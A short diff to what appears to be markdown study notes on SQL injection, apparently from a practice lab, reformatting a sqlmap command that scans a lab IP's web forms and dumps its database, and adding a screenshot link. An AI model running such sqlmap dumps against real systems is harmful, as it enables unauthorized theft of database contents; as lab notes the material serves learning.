@@ -43,4 +43,7 @@ SQL injection is the art of modifying a SQL query so you can get access to the t
 		--dump-all
 
 #Vulnerable Web Application 
-	sqlmap -u http://10.10.124.150/ --forms --dump 
+
+	sqlmap -u http://10.10.124.150/ --forms --dump
+	
+![sql1](https://user-images.githubusercontent.com/94765997/179359810-fcc9272b-52ab-4eb4-b5e2-d503f5931e0a.png)
